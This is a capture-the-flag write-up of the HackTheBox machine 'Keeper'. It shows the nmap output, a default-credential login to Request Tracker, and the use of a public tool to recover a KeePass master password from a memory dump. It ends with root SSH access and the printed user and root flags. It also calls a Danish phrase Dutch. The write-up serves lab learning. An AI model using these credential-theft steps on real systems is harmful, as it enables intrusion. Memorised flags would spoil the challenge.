---
layout: post
title: Keeper - Easy - Linux
date: 12-08-2023
categories: [CTF - HackTheBox]
tag: [Request Tracker, Dump File, KeePass, Putty Key, SSH]
---

# Nmap scan
```
# Nmap 7.93 scan initiated Sat Aug 12 20:03:13 2023 as: nmap -sC -sV -p- -oA nmap/keeper-allports -v 10.129.135.44
Nmap scan report for 10.129.135.44
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3539d439404b1f6186dd7c37bb4b989e (ECDSA)
|_  256 1ae972be8bb105d5effedd80d8efc066 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 12 20:03:37 2023 -- 1 IP address (1 host up) scanned in 24.70 seconds
```

# Inspecting port 80 - http://tickets.keeper.htb/rt/
nginx is hosting an application called Request Tracker 4.4.4. Default credentials allowed access to the admin account.

![e9cdb1b34e365d964d5f79976ce8c03d.png](/assets/img/e9cdb1b34e365d964d5f79976ce8c03d.png)

# Discovering user credentials
User credentials discovered in the users profile.

![3f887204704d923cc6f79a9b001656c9.png](/assets/img/3f887204704d923cc6f79a9b001656c9.png)

# SSH - lnorgaard
User credentials allowed SSH access.

```
┌─[✗]─[parrot@parrot]─[~/hackthebox/keeper]
└──╼ $ssh lnorgaard@keeper.htb
lnorgaard@keeper.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ cat user.txt
30ece4a7c2139299d406f52d04485f5c
lnorgaard@keeper:~$ 
```

# Inspecting RT30000.zip
Folder contains a dump file and a KeePass vault. 

```
lnorgaard@keeper:~$ ls -la
total 85380
drwxr-xr-x 4 lnorgaard lnorgaard     4096 Jul 25 20:00 .
drwxr-xr-x 3 root      root          4096 May 24 16:09 ..
lrwxrwxrwx 1 root      root             9 May 24 15:55 .bash_history -> /dev/null
-rw-r--r-- 1 lnorgaard lnorgaard      220 May 23 14:43 .bash_logout
-rw-r--r-- 1 lnorgaard lnorgaard     3771 May 23 14:43 .bashrc
drwx------ 2 lnorgaard lnorgaard     4096 May 24 16:09 .cache
-rw------- 1 lnorgaard lnorgaard      807 May 23 14:43 .profile
-rw-r--r-- 1 root      root      87391651 Aug 13 21:34 RT30000.zip
drwx------ 2 lnorgaard lnorgaard     4096 Jul 24 10:25 .ssh
-rw-r----- 1 root      lnorgaard       33 Aug 13 21:29 user.txt
-rw-r--r-- 1 root      root            39 Jul 20 19:03 .vimrc
lnorgaard@keeper:~$ 
```

```
┌─[parrot@parrot]─[~/hackthebox/keeper/zipcontents]
└──╼ $ls -la
total 332808
drwxr-xr-x 1 parrot parrot        88 Aug 13 20:35 .
drwxr-xr-x 1 parrot parrot       126 Aug 13 20:35 ..
-rwxr-x--- 1 parrot parrot 253395188 May 24 11:51 KeePassDumpFull.dmp
-rwxr-x--- 1 parrot parrot      3630 May 24 11:51 passcodes.kdbx
```

# Extracting KeePass master password
Source: https://github.com/CMEPW/keepass-dump-masterkey

```
┌─[parrot@parrot]─[~/hackthebox/keeper]
└──╼ $python3 dump.py zipcontents/KeePassDumpFull.dmp 
2023-08-13 20:36:16,740 [.] [main] Opened zipcontents/KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

# Password Analysis
Using google translate on the complete word `med` suggests the word is Dutch. To expand on that the missing letter in `fl●de` is probably a vowel. Googling `med flode` returns the following as the top result.

`Rødgrød med fløde, red berry pudding with cream, is the hallmark dessert of Denmark. A simple yet delicious dessert, this dish is made with four ingredients—berries, water, sugar, and potato starch or cornstarch—then topped with heavy cream. Use tart berries like red currants if you can find them.`

This seems to fit the pattern if possible passwords. The password should either be `Rødgrød med fløde` or `rødgrød med fløde`.

# Accessing KeePass vault
The password was correct and opened the vault exposing a password and a Putty SSH key.

![da312e074a621f842760f6536e049026.png](/assets/img/da312e074a621f842760f6536e049026.png)

# Converting Putty key to OpenSSH
`puttygen.exe > Import Key > Export OpenSSH key`

# Logging in as root
`ssh -i root.key root@keeper.htb`

```
┌─[parrot@parrot]─[~/hackthebox/keeper]
└──╼ $ssh -i root.key root@keeper.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# 
root@keeper:~# cat /root/root.txt
823f37327dcc60f7c3cf05fc49d8da67
root@keeper:~# 
```

